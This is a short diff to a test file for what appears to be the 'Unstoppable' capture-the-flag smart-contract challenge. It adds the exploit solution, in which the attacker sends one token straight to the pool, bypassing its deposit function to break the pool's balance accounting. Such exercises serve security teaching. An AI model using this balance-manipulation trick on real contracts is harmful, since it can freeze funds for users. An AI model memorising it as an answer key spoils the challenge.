@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let txn = await this.token.connect(attacker).transfer(this.pool.address, 1);
+        console.log(
+            "Attacker bypassed depositTokens to alter the balance, tx: "
+            , txn.hash);
     });
 
     after(async function () {
